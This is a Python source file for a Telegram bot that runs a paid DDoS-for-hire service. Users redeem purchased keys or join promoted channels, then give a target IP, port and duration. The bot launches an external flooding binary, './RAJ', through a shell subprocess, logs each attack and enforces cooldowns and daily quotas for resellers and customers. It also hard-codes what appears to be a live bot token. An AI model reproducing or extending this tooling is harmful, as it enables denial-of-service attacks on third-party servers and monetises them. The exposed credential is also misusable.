import os
import json
import subprocess
import threading
import telebot
import datetime
import random
import string
from telebot import types
from apscheduler.schedulers.background import BackgroundScheduler

# Insert your Telegram bot token here
bot = telebot.TeleBot('6098885239:AAH_NmAE8a4wBWtYtUz1wICoS6k29md2wvc')

# Admin user IDs
admin_id = {"1257888659"}
# Channel ID to send feedback screenshots
feedback_channel_id = '@bgmihackset'  # Use the actual channel username with @ or channel ID

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"
RESELLERS_FILE = "resellers.json"
TEMP_ACCESS_FILE = "temporary_access.json"
DAILY_USAGE_FILE = "daily_usage.json"

# In-memory storage
users = {}
keys = {}
resellers = {}
last_attack_time = {}
temporary_access = {}
daily_usage = {}

# Required channels for attack verification
REQUIRED_CHANNELS = [
    "https://t.me/+SCgV7yRZK3Q3YTA1",  # Replace with your actual channel links
    "https://t.me/TABISHDDOS"
]

MAX_ATTACK_USES = 5  # Maximum allowed attacks for temporary access
FREE_USER_DAILY_LIMIT = 5  # Daily attack limit for free users

scheduler = BackgroundScheduler()

def load_data():
    global users, keys, resellers, temporary_access, daily_usage
    users = read_users()
    keys = read_keys()
    resellers = load_resellers()
    temporary_access = load_temporary_access()
    daily_usage = load_daily_usage()

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def read_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def load_resellers():
    try:
        with open(RESELLERS_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_resellers(resellers_data):
    with open(RESELLERS_FILE, "w") as file:
        json.dump(resellers_data, file, indent=4)

def load_temporary_access():
    try:
        with open(TEMP_ACCESS_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_temporary_access():
    with open(TEMP_ACCESS_FILE, "w") as file:
        json.dump(temporary_access, file)

def load_daily_usage():
    try:
        with open(DAILY_USAGE_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_daily_usage():
    with open(DAILY_USAGE_FILE, "w") as file:
        json.dump(daily_usage, file)

def reset_daily_usage():
    global daily_usage
    daily_usage = {}
    save_daily_usage()
    print("Daily usage has been reset.")

scheduler.add_job(reset_daily_usage, 'cron', hour=0, minute=0)
scheduler.start()

def log_command(user_id, target, port, duration):
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"[{timestamp}] UserID: {user_id}, Target: {target}:{port}, Duration: {duration}s\n"
    with open(LOG_FILE, "a") as file:
        file.write(log_entry)

def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                return "No data found."
            else:
                file.truncate(0)
                return "Logs cleared successfully."
    except FileNotFoundError:
        return "No data found."

def generate_key(duration_days):
    key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    expiration_date = (datetime.datetime.now() + datetime.timedelta(days=duration_days)).strftime('%Y-%m-%d %H:%M:%S')
    keys[key] = expiration_date
    save_keys()
    return key

@bot.message_handler(commands=['genkey'])
def genkey_command(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⚠️ Access denied: Only the bot owner can run this command.", parse_mode='Markdown')
        return

    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /genkey <duration_days>", parse_mode='Markdown')
        return

    try:
        duration_days = int(parts[1])
        key = generate_key(duration_days)
        bot.reply_to(message, f"✅ Key generated: `{key}` with duration: {duration_days} days", parse_mode='Markdown')
    except ValueError:
        bot.reply_to(message, "Please enter a valid number of days.", parse_mode='Markdown')

@bot.message_handler(commands=['redeem'])
def redeem_command(message):
    user_id = str(message.chat.id)
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /redeem <key>", parse_mode='Markdown')
        return

    key = parts[1]
    if key in keys:
        users[user_id] = keys.pop(key)
        save_users()
        save_keys()
        bot.reply_to(message, f"✅ Key redeemed successfully! Access granted until {users[user_id]}.", parse_mode='Markdown')
    else:
        bot.reply_to(message, "❌ Invalid or expired key.", parse_mode='Markdown')

@bot.message_handler(commands=['start'])
def start_command(message):
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    attack_button = types.KeyboardButton("🚀 Attack")
    myinfo_button = types.KeyboardButton("👤 My Info")
    redeem_button = types.KeyboardButton("🎟️ Redeem Key")
    feedback_button = types.KeyboardButton("📸 Send Feedback")
    help_button = types.KeyboardButton("❓ Help")
    markup.add(attack_button, myinfo_button, redeem_button, feedback_button, help_button)

    bot.reply_to(message, "*Welcome to the bot!*\n\n*Select an option below to get started.*", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "❓ Help")
def help_command(message):
    help_text = (
        "Welcome to the Bot Help Section!\n\n"
        "Here are the available commands:\n"
        "/genkey <days> - Generate a key (Admin only).\n"
        "/redeem <key> - Redeem a key to gain access.\n"
        "/broadcast <message> - Send a broadcast (Admin only).\n"
        "/remove_user <user_id> - Remove a user (Admin only).\n"
        "/show_users - Show all users (Admin only).\n"
        "/show_logs - Show attack logs (Admin only).\n"
    )
    bot.reply_to(message, help_text, parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "🚀 Attack")
def handle_attack(message):
    user_id = str(message.chat.id)

    # Check if user has VIP access or temporary access
    if user_id not in users and not has_temporary_access(user_id):
        prompt_join_channels(message)
        return

    expiration_date = users.get(user_id, None)
    if expiration_date and datetime.datetime.now() > datetime.datetime.strptime(expiration_date, '%Y-%m-%d %H:%M:%S'):
        bot.reply_to(message, "❗️*Your access has expired. Please buy a new key @hack_chiye.*", parse_mode='Markdown')
        return

    # Check daily usage
    if user_id not in daily_usage:
        daily_usage[user_id] = 0

    if daily_usage[user_id] >= FREE_USER_DAILY_LIMIT:
        bot.reply_to(message, "⚠️ *You have reached your daily attack limit. Please try again tomorrow.*", parse_mode='Markdown')
        return

    # Check cooldown period
    if user_id in last_attack_time:
        time_since_last = (datetime.datetime.now() - last_attack_time[user_id]).total_seconds()
        if time_since_last < 120:  # 2 minutes cooldown
            remaining = 120 - time_since_last
            bot.reply_to(message, f"⌛️ *Cooldown active. Wait {int(remaining)} seconds.*", parse_mode='Markdown')
            return

    bot.reply_to(message, "Enter target IP, port, and duration in seconds (e.g., '192.168.1.1 80 60')", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_attack_details)

def prompt_join_channels(message):
    markup = types.InlineKeyboardMarkup()
    for channel in REQUIRED_CHANNELS:
        button = types.InlineKeyboardButton(text=f"Join {channel}", url=channel)
        markup.add(button)
    verify_button = types.InlineKeyboardButton("I've Joined", callback_data="verify_channels")
    markup.add(verify_button)
    bot.reply_to(message, "⚠️ *Please join the following channels to gain access.*", reply_markup=markup, parse_mode='Markdown')

def has_temporary_access(user_id):
    if user_id in temporary_access:
        if temporary_access[user_id] < MAX_ATTACK_USES:
            return True
        else:
            del temporary_access[user_id]  # Remove access after limit is reached
            save_temporary_access()
    return False

@bot.callback_query_handler(func=lambda call: call.data == "verify_channels")
def verify_channels_callback(call):
    user_id = str(call.message.chat.id)
    if user_id not in temporary_access:
        temporary_access[user_id] = 0
        save_temporary_access()
        bot.send_message(call.message.chat.id, "✅ *You have been verified! You can now use the attack feature up to 10 times.*", parse_mode='Markdown')
    else:
        bot.send_message(call.message.chat.id, "⚠️ *You are already verified.*", parse_mode='Markdown')

def process_attack_details(message):
    user_id = str(message.chat.id)
    details = message.text.split()

    if len(details) != 3:
        bot.reply_to(message, "Invalid format. Please provide target IP, port, and duration.", parse_mode='Markdown')
        return

    target, port_str, duration_str = details
    try:
        port = int(port_str)
        duration = int(duration_str)
    except ValueError:
        bot.reply_to(message, "Invalid port or duration. Please use numeric values.", parse_mode='Markdown')
        return

    if duration > 239:
        bot.reply_to(message, "❗️Error: Duration must be less than 239 seconds.", parse_mode='Markdown')
        return

    if not is_valid_ip(target):
        bot.reply_to(message, "❗️Error: Invalid IP address format.", parse_mode='Markdown')
        return

    if port < 1 or port > 65535:
        bot.reply_to(message, "❗️Error: Port must be between 1 and 65535.", parse_mode='Markdown')
        return

    # Record the attack
    log_command(user_id, target, port, duration)
    last_attack_time[user_id] = datetime.datetime.now()

    # Use up one temporary access if applicable
    if user_id in temporary_access:
        temporary_access[user_id] += 1
        save_temporary_access()

    # Increment daily usage
    daily_usage[user_id] += 1
    save_daily_usage()

    # Simulate attack (replace with actual attack logic)
    attack_command = f"./RAJ {target} {port} {duration} 1200"
    subprocess.Popen(attack_command, shell=True)

    # Notify user
    bot.reply_to(message, f"🚀 *Attack initiated on {target}:{port} for {duration} seconds.*", parse_mode='Markdown')

    # Schedule completion message
    threading.Timer(duration, send_attack_completion, args=[message.chat.id, target, port]).start()

def send_attack_completion(chat_id, target, port):
    bot.send_message(chat_id, f"✅ *Attack on {target}:{port} has completed.*", parse_mode='Markdown')

def is_valid_ip(ip):
    parts = ip.split('.')
    if len(parts) != 4:
        return False
    for part in parts:
        try:
            num = int(part)
            if num < 0 or num > 255:
                return False
        except ValueError:
            return False
    return True

@bot.message_handler(func=lambda message: message.text == "👤 My Info")
def my_info(message):
    user_id = str(message.chat.id)
    username = message.chat.username or "No username"

    if user_id in admin_id:
        role = "Admin"
        key_expiration = "Lifetime"
    elif user_id in resellers:
        role = "Reseller"
        key_expiration = "N/A"
    elif user_id in users:
        role = "User"
        key_expiration = users[user_id]
    elif user_id in temporary_access:
        role = "Temporary User"
        key_expiration = f"{MAX_ATTACK_USES - temporary_access[user_id]} uses left"
    else:
        role = "Guest"
        key_expiration = "No active key"

    response = (
        f"👤 *User Info* 👤\n\n"
        f"ℹ️ *Username:* @{username}\n"
        f"🆔 *UserID:* {user_id}\n"
        f"🚹 *Role:* {role}\n"
        f"📅 *Key Expiration:* {key_expiration}\n"
    )

    if user_id in resellers:
        balance = resellers[user_id]
        response += f"💰 *Balance:* {balance} Rs\n"

    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "📸 Send Feedback")
def send_feedback(message):
    bot.reply_to(message, "📸 *Please send your feedback screenshot.*", parse_mode='Markdown')

@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    # Forward the received screenshot to the specified channel
    bot.forward_message(feedback_channel_id, message.chat.id, message.message_id)
    bot.reply_to(message, "✅ *Your feedback has been sent. Thank you!*", parse_mode='Markdown')

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⚠️ Access denied: Only the bot owner can run this command.", parse_mode='Markdown')
        return

    parts = message.text.split(' ', 1)
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /broadcast <message>", parse_mode='Markdown')
        return

    broadcast_msg = parts[1]
    all_users = set(users.keys()) | set(resellers.keys()) | admin_id

    sent_count = 0
    for user in all_users:
        try:
            bot.send_message(user, f"📢 *Broadcast Message :*\n\n*{broadcast_msg}*", parse_mode='Markdown')
            sent_count += 1
        except Exception as e:
            print(f"Error sending message to {user}: {e}")

    bot.reply_to(message, f"📢 Broadcast sent to {sent_count} users.", parse_mode='Markdown')

@bot.message_handler(commands=['show_logs'])
def show_logs(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⚠️ Access denied: Only the bot owner can run this command.", parse_mode='Markdown')
        return

    try:
        with open(LOG_FILE, "r") as file:
            logs = file.read()
            if not logs:
                bot.reply_to(message, "ℹ️ No logs available.", parse_mode='Markdown')
            else:
                bot.reply_to(message, f"📄 *Attack Logs:*\n\n{logs}", parse_mode='Markdown')
    except FileNotFoundError:
        bot.reply_to(message, "ℹ️ No logs found.", parse_mode='Markdown')

@bot.message_handler(commands=['show_users'])
def show_users(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⚠️ Access denied: Only the bot owner can run this command.", parse_mode='Markdown')
        return

    if not users:
        bot.reply_to(message, "ℹ️ No registered users.", parse_mode='Markdown')
    else:
        users_list = "\n".join([f"UserID: {user} - Expiration: {exp}" for user, exp in users.items()])
        bot.reply_to(message, f"👥 *Registered Users:*\n\n{users_list}", parse_mode='Markdown')

@bot.message_handler(commands=['remove_user'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⚠️ Access denied: Only the bot owner can run this command.", parse_mode='Markdown')
        return

    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /remove_user <user_id>", parse_mode='Markdown')
        return

    target_user_id = parts[1]
    if target_user_id in users:
        del users[target_user_id]
        save_users()
        bot.reply_to(message, f"✅ User {target_user_id} removed successfully.", parse_mode='Markdown')
    else:
        bot.reply_to(message, "❌ User not found.", parse_mode='Markdown')

if __name__ == "__main__":
    load_data()
    bot.polling(none_stop=True)
